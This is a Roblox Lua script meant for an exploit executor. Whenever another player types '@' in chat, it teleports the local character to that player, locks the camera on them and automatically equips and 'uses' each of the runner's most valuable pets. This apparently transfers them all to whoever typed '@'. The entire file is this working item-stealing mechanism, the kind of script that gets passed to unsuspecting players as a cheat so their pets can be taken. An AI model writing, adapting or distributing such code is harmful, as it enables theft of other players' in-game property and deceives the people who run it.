local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

-- PET PRIORITY (Highest to Lowest)
local PET_PRIORITY = {
    ["T-Rex"] = 100,
    ["Dragonfly"] = 90,
    ["Queen bee"] = 85,
    ["Disco bee"] = 80,
    ["Raccoon"] = 75,
    ["Mimic Octopus"] = 70,
    ["Butterfly"] = 65
}

-- ITEMS TO IGNORE (Will skip these)
local IGNORE_ITEMS = {
    "Shovel",
    "Destroy Plants"
}

--[[ ITEM SYSTEM ]]--
local function getBestItem()
    local bestItem, highestScore = nil, 0
    
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        -- Skip ignored items
        local shouldIgnore = false
        for _,ignore in pairs(IGNORE_ITEMS) do
            if string.find(item.Name, ignore) then
                shouldIgnore = true
                break
            end
        end
        if shouldIgnore then continue end
        
        -- Check pet priority
        local score = 0
        for pet, points in pairs(PET_PRIORITY) do
            if string.find(item.Name, pet) then
                score = points
                break
            end
        end
        
        if score > highestScore then
            highestScore = score
            bestItem = item
        end
    end
    
    return bestItem
end

--[[ INTERACTION SYSTEM ]]--
local function interactWithPlayer(target)
    -- Teleport to target
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local torso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
    LocalPlayer.Character.HumanoidRootPart.CFrame = torso.CFrame * CFrame.new(0, 0, -4)

    -- Force first-person view
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5

    -- Look at target continuously
    local lookConn
    lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, torso.Position)
    end)

    -- Process all valuable items
    while true do
        local item = getBestItem()
        if not item then break end  -- Exit when no items left
        
        -- Equip the item
        LocalPlayer.Character.Humanoid:EquipTool(item)
        task.wait(0.5)
        
        -- Hold click for 5 seconds (center screen)
        UserInputService:SetMouseLocation(0.5, 0.5)
        mouse1press()
        task.wait(5)
        mouse1release()
        
        -- Small delay between items
        task.wait(0.5)
    end

    -- Cleanup
    if lookConn then lookConn:Disconnect() end
end

--[[ CHAT DETECTION ]]--
local function onChatted(player, msg)
    if player == LocalPlayer then return end
    if not string.find(msg, "@") then return end
    
    -- Interact with player
    interactWithPlayer(player)
end

--[[ SETUP ]]--
-- Set up chat listeners
for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onChatted(player, msg)
    end)
end)

print("✅ SYSTEM ACTIVE - Waiting for @ mentions")
